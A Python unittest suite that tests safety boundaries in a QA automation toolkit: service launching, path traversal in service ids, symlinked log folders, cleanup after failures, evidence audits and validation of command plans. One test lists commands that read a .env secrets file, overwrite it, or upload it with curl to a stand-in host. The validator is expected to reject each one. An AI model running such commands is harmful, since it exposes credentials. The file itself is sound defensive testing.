#!/usr/bin/env python3
import argparse
import importlib.util
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

SCRIPT_DIR = Path(__file__).resolve().parents[1]
if str(SCRIPT_DIR) not in sys.path:
    sys.path.insert(0, str(SCRIPT_DIR))


def write_json(path: Path, value: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, indent=2, ensure_ascii=False), encoding="utf-8")


def load_module(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"Cannot import {path}")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def minimal_matrix(version: int = 2) -> dict:
    return {
        "schemaVersion": version,
        "requirements": [
            {
                "id": "R1",
                "source": "security fixture",
                "text": "The health endpoint returns ok=true.",
                "test_ids": ["T1"],
                "status": "Untested",
            }
        ],
        "tests": [
            {
                "id": "T1",
                "requirement_ids": ["R1"],
                "type": "api",
                "expected": "The health endpoint returns ok=true.",
                "status": "Untested",
            }
        ],
    }


def minimal_plan(artifact_dir: Path, version: int = 2, *, command: bool = False) -> dict:
    step = {
        "action": "command" if command else "api",
        "id": "T1-probe",
        "testIds": ["T1"],
        "requirementIds": ["R1"],
        "evidenceType": "command" if command else "api_response",
        "proves": "The planned probe verifies the health contract.",
    }
    if command:
        step.update({"command": [sys.executable, "-c", "print('ok')"], "expectExitCode": 0})
    else:
        step.update({"path": "/health", "expectStatus": 200})
    return {
        "schemaVersion": version,
        "baseUrl": "http://127.0.0.1:9",
        "artifactDir": str(artifact_dir),
        "scenarios": [{"id": "security", "steps": [step]}],
    }


def manual_ledger(evidence_path: Path) -> dict:
    return {
        "schema_version": 2,
        "requirements": [
            {
                "id": "R1",
                "source": "security fixture",
                "text": "The health endpoint returns ok=true.",
                "test_ids": ["T1"],
                "status": "Passed",
                "evidence_ids": ["E1"],
            }
        ],
        "tests": [
            {
                "id": "T1",
                "requirement_ids": ["R1"],
                "type": "api",
                "expected": "The health endpoint returns ok=true.",
                "status": "Passed",
                "evidence_ids": ["E1"],
            }
        ],
        "evidence": [
            {
                "id": "E1",
                "type": "api_response",
                "url": "/health",
                "body_path": str(evidence_path),
                "current_run": True,
                "status_code": 200,
                "checked_json": {"ok": True},
                "assertions": ["HTTP 200 and ok=true were observed."],
                "proves": "The health response returned ok=true.",
            }
        ],
    }


class SecurityBoundaryTests(unittest.TestCase):
    def test_environment_args_create_explicit_adapter_context(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            context_path = Path(temporary) / "adapter-context.json"
            module = load_module("run_qa_cycle_boundary_fixture", SCRIPT_DIR / "run_qa_cycle.py")
            error = module.apply_environment_boundary_args(
                context_path,
                "test",
                "synthetic fixture data; no production data",
            )
            self.assertIsNone(error)
            context = json.loads(context_path.read_text(encoding="utf-8"))
            self.assertEqual(context.get("adapter"), "explicit_environment_boundary")
            self.assertEqual(context.get("environment_boundary", {}).get("runtime_mode"), "test")
            self.assertIn("no production data", context.get("environment_boundary", {}).get("data_boundary_status", ""))

    def test_cycle_never_deletes_directory_shaped_output(self) -> None:
        with tempfile.TemporaryDirectory(prefix="qa-cycle-output-safety-") as raw:
            root = Path(raw)
            run_dir = root / "run"
            run_dir.mkdir()
            write_json(run_dir / "test-plan.json", minimal_plan(run_dir))
            external_report = root / "must-survive"
            external_report.mkdir()
            sentinel = external_report / "sentinel.txt"
            sentinel.write_text("user data", encoding="utf-8")

            proc = subprocess.run(
                [
                    sys.executable,
                    str(SCRIPT_DIR / "run_qa_cycle.py"),
                    "--run-dir",
                    str(run_dir),
                    "--report",
                    str(external_report),
                ],
                text=True,
                capture_output=True,
            )

            self.assertNotEqual(proc.returncode, 0)
            self.assertTrue(sentinel.is_file(), "目录形态的输出目标及其用户数据必须原样保留")

    def test_service_process_match_is_not_basename_substring(self) -> None:
        module = load_module("service_runtime_security_test", SCRIPT_DIR / "service_runtime.py")
        with mock.patch.object(module, "process_command", return_value="/usr/local/bin/node unrelated.js --port 9999"):
            self.assertFalse(module.process_matches(4242, ["node", "server.js", "--port", "3000"]))

    def test_service_identity_is_sampled_until_runtime_metadata_stabilizes(self) -> None:
        module = load_module("service_runtime_identity_test", SCRIPT_DIR / "service_runtime.py")
        proc = mock.Mock(pid=4242)
        proc.poll.return_value = None
        launcher = {
            "pid": 4242,
            "pgid": 4242,
            "command": "python3 -m http.server 3000",
            "command_sha256": "launcher",
            "os_started_at": "start",
        }
        runtime = {
            "pid": 4242,
            "pgid": 4242,
            "command": "/usr/bin/python3 -m http.server 3000",
            "command_sha256": "runtime",
            "os_started_at": "start",
        }
        with (
            mock.patch.object(module, "process_identity", side_effect=[launcher, runtime, runtime]),
            mock.patch.object(module.time, "sleep"),
        ):
            self.assertEqual(module.stable_process_identity(proc), runtime)

    def test_service_id_cannot_escape_the_log_directory(self) -> None:
        module = load_module(
            "service_runtime_service_id_test",
            SCRIPT_DIR / "service_runtime.py",
        )
        with tempfile.TemporaryDirectory(
            prefix="qa-service-id-boundary-"
        ) as raw:
            root = Path(raw)
            project_root = root / "project"
            project_root.mkdir()
            preflight = root / "service-preflight.json"
            write_json(
                preflight,
                {
                    "schema_version": 1,
                    "project_root": str(project_root),
                    "services": [
                        {
                            "id": "../../escaped",
                            "path": ".",
                            "default_url": "http://127.0.0.1:9",
                        }
                    ],
                    "start_plan": [
                        {
                            "service": "../../escaped",
                            "cwd": ".",
                            "command": [
                                sys.executable,
                                "-c",
                                "raise SystemExit(0)",
                            ],
                        }
                    ],
                },
            )
            args = argparse.Namespace(
                run_dir=str(root),
                preflight=str(preflight),
                service=None,
                start=True,
                force=False,
                no_wait=True,
                wait_timeout=1.0,
                poll_interval=0.1,
            )

            with mock.patch.object(module.subprocess, "Popen") as popen:
                report = module.start_services(args)

            self.assertEqual(report["summary"]["failed_count"], 1)
            self.assertEqual(
                report["services"][0]["status"],
                "blocked_by_safety",
            )
            self.assertIn(
                "service id",
                " ".join(report["services"][0]["errors"]),
            )
            popen.assert_not_called()
            self.assertFalse((root.parent / "escaped.stdout.log").exists())

    def test_service_log_directory_symlink_is_rejected(self) -> None:
        module = load_module(
            "service_runtime_log_symlink_test",
            SCRIPT_DIR / "service_runtime.py",
        )
        with tempfile.TemporaryDirectory(
            prefix="qa-service-log-boundary-"
        ) as raw:
            root = Path(raw)
            project_root = root / "project"
            project_root.mkdir()
            outside = root / "outside"
            outside.mkdir()
            (root / "service-logs").symlink_to(
                outside,
                target_is_directory=True,
            )
            preflight = root / "service-preflight.json"
            write_json(
                preflight,
                {
                    "schema_version": 1,
                    "project_root": str(project_root),
                    "services": [
                        {
                            "id": "fixture",
                            "path": ".",
                            "default_url": "http://127.0.0.1:9",
                        }
                    ],
                    "start_plan": [
                        {
                            "service": "fixture",
                            "cwd": ".",
                            "command": [
                                sys.executable,
                                "-c",
                                "raise SystemExit(0)",
                            ],
                        }
                    ],
                },
            )
            args = argparse.Namespace(
                run_dir=str(root),
                preflight=str(preflight),
                service=None,
                start=True,
                force=False,
                no_wait=True,
                wait_timeout=1.0,
                poll_interval=0.1,
            )

            with (
                mock.patch.object(
                    module,
                    "readiness",
                    return_value={"check": "tcp", "ready": False},
                ),
                mock.patch.object(module.subprocess, "Popen") as popen,
            ):
                report = module.start_services(args)

            self.assertEqual(report["summary"]["failed_count"], 1)
            self.assertEqual(
                report["services"][0]["status"],
                "failed_to_start",
            )
            self.assertIn(
                "log boundary",
                report["services"][0]["error"],
            )
            popen.assert_not_called()
            self.assertEqual(list(outside.iterdir()), [])

    def test_service_launch_is_cleaned_if_runtime_persistence_fails(self) -> None:
        module = load_module("service_runtime_persistence_test", SCRIPT_DIR / "service_runtime.py")
        with tempfile.TemporaryDirectory(prefix="qa-service-persist-") as raw:
            root = Path(raw)
            project_root = root / "project"
            project_root.mkdir()
            preflight = root / "service-preflight.json"
            output = root / "service-runtime.json"
            write_json(
                preflight,
                {
                    "schema_version": 1,
                    "project_root": str(project_root),
                    "services": [
                        {
                            "id": "fixture",
                            "path": ".",
                            "default_url": "http://127.0.0.1:9",
                        }
                    ],
                    "start_plan": [
                        {
                            "service": "fixture",
                            "cwd": ".",
                            "command": [
                                sys.executable,
                                "-c",
                                "__import__('time').sleep(60)",
                            ],
                            "reason": "fault injection",
                        }
                    ],
                },
            )
            fake_proc = mock.Mock(pid=54321)
            fake_proc.poll.side_effect = [None, 0, 0, 0]
            original_write = module.write_json
            write_count = 0

            def flaky_write(path: Path, value: dict) -> None:
                nonlocal write_count
                write_count += 1
                if write_count == 3:
                    raise OSError("injected persistence failure")
                original_write(path, value)

            with (
                mock.patch.object(
                    sys,
                    "argv",
                    [
                        "service_runtime.py",
                        "--run-dir",
                        str(root),
                        "--preflight",
                        str(preflight),
                        "--out",
                        str(output),
                        "--start",
                        "--no-wait",
                    ],
                ),
                mock.patch.object(
                    module,
                    "readiness",
                    return_value={"check": "tcp", "ready": False},
                ),
                mock.patch.object(
                    module.subprocess,
                    "Popen",
                    return_value=fake_proc,
                ),
                mock.patch.object(
                    module.os,
                    "getpgid",
                    return_value=54321,
                ),
                mock.patch.object(module.os, "killpg") as killpg,
                mock.patch.object(module, "write_json", side_effect=flaky_write),
            ):
                self.assertEqual(module.main(), 1)

            report = json.loads(output.read_text(encoding="utf-8"))
            self.assertEqual(
                killpg.call_args_list,
                [mock.call(54321, module.signal.SIGTERM)],
                report,
            )
            emergency = report["safety"]["emergency_cleanup"]
            self.assertEqual(emergency["attempted_count"], 1)
            self.assertEqual(emergency["remaining_count"], 0)
            self.assertEqual(report["summary"]["failed_count"], 1)

    def test_started_service_stage_requires_cleanup_without_artifact(self) -> None:
        module = load_module("run_cycle_cleanup_test", SCRIPT_DIR / "run_qa_cycle.py")
        with tempfile.TemporaryDirectory(prefix="qa-cleanup-missing-") as raw:
            runtime = object.__new__(module.CycleRuntime)
            runtime.service_start_attempted = True
            runtime.service_runtime_path = Path(raw) / "missing-runtime.json"
            runtime.current_artifacts = set()
            self.assertTrue(runtime.cleanup_required())

    def test_service_stop_signals_all_groups_before_shared_deadline(self) -> None:
        module = load_module("service_runtime_parallel_stop_test", SCRIPT_DIR / "service_runtime.py")
        with tempfile.TemporaryDirectory(prefix="qa-service-stop-") as raw:
            root = Path(raw)
            runtime_path = root / "service-runtime.json"

            def identity(pid: int) -> dict:
                command = f"/usr/bin/python3 service-{pid}.py"
                return {
                    "pid": pid,
                    "pgid": pid,
                    "command": command,
                    "command_sha256": module.command_sha256(command),
                    "os_started_at": "start",
                }

            write_json(
                runtime_path,
                {
                    "schema_version": 1,
                    "services": [
                        {
                            "service": "one",
                            "pid": 101,
                            "pgid": 101,
                            "command": ["python3", "service-101.py"],
                            "process_identity": identity(101),
                        },
                        {
                            "service": "two",
                            "pid": 102,
                            "pgid": 102,
                            "command": ["python3", "service-102.py"],
                            "process_identity": identity(102),
                        },
                    ],
                },
            )
            args = mock.Mock(
                run_dir=str(root),
                runtime=str(runtime_path),
                service=[],
                stop_timeout=0.1,
            )
            clock_value = 0.0

            def clock() -> float:
                nonlocal clock_value
                clock_value += 0.1
                return clock_value

            with (
                mock.patch.object(module, "process_identity", side_effect=identity),
                mock.patch.object(module, "pid_alive", return_value=True),
                mock.patch.object(module.os, "getpgrp", return_value=999),
                mock.patch.object(module.os, "killpg") as killpg,
                mock.patch.object(module.time, "time", side_effect=clock),
                mock.patch.object(module.time, "sleep"),
            ):
                report = module.stop_services(args)

            self.assertEqual(
                killpg.call_args_list[:2],
                [
                    mock.call(101, module.signal.SIGTERM),
                    mock.call(102, module.signal.SIGTERM),
                ],
            )
            self.assertEqual(report["summary"]["failed_count"], 2)

    def test_service_stop_cli_returns_nonzero_for_cleanup_failure(self) -> None:
        module = load_module(
            "service_runtime_stop_exit_test",
            SCRIPT_DIR / "service_runtime.py",
        )
        with tempfile.TemporaryDirectory(
            prefix="qa-service-stop-exit-",
        ) as raw:
            root = Path(raw)
            runtime_path = root / "service-runtime.json"
            write_json(runtime_path, {"schema_version": 1, "services": []})
            report = {
                "schema_version": 1,
                "mode": "stop",
                "services": [
                    {
                        "service": "fixture",
                        "status": "failed",
                        "reason": "process remained alive after SIGKILL",
                    },
                ],
                "summary": {
                    "stopped_count": 0,
                    "skipped_count": 0,
                    "failed_count": 1,
                },
                "input_artifact_errors": [],
            }
            with (
                mock.patch.object(
                    sys,
                    "argv",
                    [
                        "service_runtime.py",
                        "--run-dir",
                        str(root),
                        "--runtime",
                        str(runtime_path),
                        "--stop",
                    ],
                ),
                mock.patch.object(
                    module,
                    "stop_services",
                    return_value=report,
                ),
            ):
                self.assertEqual(module.main(), 1)
            persisted = json.loads(
                (root / "service-runtime-stop.json").read_text(
                    encoding="utf-8",
                ),
            )
            self.assertEqual(persisted["summary"]["failed_count"], 1)

    def test_service_stop_cli_returns_nonzero_for_missing_runtime(self) -> None:
        module = load_module(
            "service_runtime_stop_missing_test",
            SCRIPT_DIR / "service_runtime.py",
        )
        with tempfile.TemporaryDirectory(
            prefix="qa-service-stop-missing-",
        ) as raw:
            root = Path(raw)
            with mock.patch.object(
                sys,
                "argv",
                [
                    "service_runtime.py",
                    "--run-dir",
                    str(root),
                    "--stop",
                ],
            ):
                self.assertEqual(module.main(), 1)
            persisted = json.loads(
                (root / "service-runtime-stop.json").read_text(
                    encoding="utf-8",
                ),
            )
            self.assertEqual(
                persisted["summary"]["input_artifact_error_count"],
                1,
            )

    def test_manual_evidence_cannot_pass_without_explicit_mode(self) -> None:
        with tempfile.TemporaryDirectory(prefix="qa-manual-evidence-") as raw:
            run_dir = Path(raw)
            evidence_path = run_dir / "evidence" / "health.json"
            evidence_path.parent.mkdir()
            evidence_path.write_text('{"ok": true}\n', encoding="utf-8")
            write_json(run_dir / "test-matrix.json", minimal_matrix())
            write_json(run_dir / "evidence-ledger.json", manual_ledger(evidence_path))

            audit = subprocess.run(
                [
                    sys.executable,
                    str(SCRIPT_DIR / "audit_evidence.py"),
                    "--matrix",
                    str(run_dir / "test-matrix.json"),
                    "--ledger",
                    str(run_dir / "evidence-ledger.json"),
                    "--summary",
                    str(run_dir / "audit-summary.json"),
                ],
                text=True,
                capture_output=True,
            )
            self.assertNotEqual(audit.returncode, 0, "缺少 results.json 的 Passed 证据必须默认审计失败")

            verdict = subprocess.run(
                [
                    sys.executable,
                    str(SCRIPT_DIR / "generate_verdict.py"),
                    "--ledger",
                    str(run_dir / "evidence-ledger.json"),
                    "--audit-summary",
                    str(run_dir / "audit-summary.json"),
                    "--out",
                    str(run_dir / "qa-verdict.json"),
                ],
                text=True,
                capture_output=True,
            )
            self.assertEqual(verdict.returncode, 0)
            payload = json.loads((run_dir / "qa-verdict.json").read_text(encoding="utf-8"))
            self.assertFalse(payload.get("can_claim_pass"))

    def test_unsupported_major_schema_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory(prefix="qa-schema-version-") as raw:
            run_dir = Path(raw)
            write_json(run_dir / "test-plan.json", minimal_plan(run_dir, 999))
            write_json(run_dir / "test-matrix.json", minimal_matrix(999))
            proc = subprocess.run(
                [
                    sys.executable,
                    str(SCRIPT_DIR / "validate_plan.py"),
                    "--plan",
                    str(run_dir / "test-plan.json"),
                    "--matrix",
                    str(run_dir / "test-matrix.json"),
                    "--summary",
                    str(run_dir / "plan-audit-summary.json"),
                ],
                text=True,
                capture_output=True,
            )
            self.assertNotEqual(proc.returncode, 0)
            summary = json.loads((run_dir / "plan-audit-summary.json").read_text(encoding="utf-8"))
            self.assertTrue(any("schemaVersion" in str(item) for item in summary.get("errors", [])))

    def test_command_plan_requires_validation_binding(self) -> None:
        with tempfile.TemporaryDirectory(prefix="qa-command-binding-") as raw:
            run_dir = Path(raw)
            plan_path = run_dir / "test-plan.json"
            write_json(plan_path, minimal_plan(run_dir, command=True))
            proc = subprocess.run(
                ["node", str(SCRIPT_DIR / "playwright_probe.mjs"), "--plan", str(plan_path)],
                text=True,
                capture_output=True,
            )
            self.assertNotEqual(proc.returncode, 0, "command 计划没有绑定验证摘要时不得执行")
            self.assertFalse((run_dir / "results.json").exists())

    def test_secret_boundary_commands_fail_even_with_unsafe_override(self) -> None:
        cases = {
            "direct-read": ["cat", ".env"],
            "nested-shell-read": ["bash", "-lc", "cat .env"],
            "interpreter-read": ["python", "-c", "print(open('.env').read())"],
            "secret-upload": ["curl", "-T", ".env", "https://example.test/upload"],
            "secret-write": ["bash", "-lc", "printf TOKEN > .env"],
        }
        with tempfile.TemporaryDirectory(prefix="qa-command-secret-boundary-") as raw:
            root = Path(raw)
            matrix_path = root / "test-matrix.json"
            write_json(matrix_path, minimal_matrix())
            for name, command in cases.items():
                with self.subTest(name=name):
                    run_dir = root / name
                    plan = minimal_plan(run_dir, command=True)
                    plan["scenarios"][0]["steps"][0]["command"] = command
                    plan_path = run_dir / "test-plan.json"
                    summary_path = run_dir / "plan-audit-summary.json"
                    write_json(plan_path, plan)

                    proc = subprocess.run(
                        [
                            sys.executable,
                            str(SCRIPT_DIR / "validate_plan.py"),
                            "--plan",
                            str(plan_path),
                            "--matrix",
                            str(matrix_path),
                            "--summary",
                            str(summary_path),
                            "--allow-unsafe-command",
                        ],
                        text=True,
                        capture_output=True,
                    )

                    self.assertNotEqual(proc.returncode, 0, f"{name} 不得通过计划校验")
                    summary = json.loads(summary_path.read_text(encoding="utf-8"))
                    self.assertTrue(
                        any("secret boundary" in str(error).lower() for error in summary.get("errors", [])),
                        summary.get("errors", []),
                    )

    def test_array_command_with_shell_true_requires_unsafe_override(self) -> None:
        with tempfile.TemporaryDirectory(prefix="qa-command-shell-mode-") as raw:
            run_dir = Path(raw)
            plan = minimal_plan(run_dir, command=True)
            plan["scenarios"][0]["steps"][0]["shell"] = True
            plan_path = run_dir / "test-plan.json"
            matrix_path = run_dir / "test-matrix.json"
            summary_path = run_dir / "plan-audit-summary.json"
            write_json(plan_path, plan)
            write_json(matrix_path, minimal_matrix())

            proc = subprocess.run(
                [
                    sys.executable,
                    str(SCRIPT_DIR / "validate_plan.py"),
                    "--plan",
                    str(plan_path),
                    "--matrix",
                    str(matrix_path),
                    "--summary",
                    str(summary_path),
                ],
                text=True,
                capture_output=True,
            )

            self.assertNotEqual(proc.returncode, 0)
            summary = json.loads(summary_path.read_text(encoding="utf-8"))
            self.assertTrue(
                any("shell execution" in str(error).lower() for error in summary.get("errors", [])),
                summary.get("errors", []),
            )

            allowed_summary_path = run_dir / "allowed-plan-audit-summary.json"
            allowed_proc = subprocess.run(
                [
                    sys.executable,
                    str(SCRIPT_DIR / "validate_plan.py"),
                    "--plan",
                    str(plan_path),
                    "--matrix",
                    str(matrix_path),
                    "--summary",
                    str(allowed_summary_path),
                    "--allow-unsafe-command",
                ],
                text=True,
                capture_output=True,
            )

            self.assertEqual(allowed_proc.returncode, 0)
            allowed_summary = json.loads(allowed_summary_path.read_text(encoding="utf-8"))
            self.assertTrue(
                any("shell execution" in str(warning).lower() for warning in allowed_summary.get("warnings", [])),
                allowed_summary.get("warnings", []),
            )


if __name__ == "__main__":
    unittest.main()
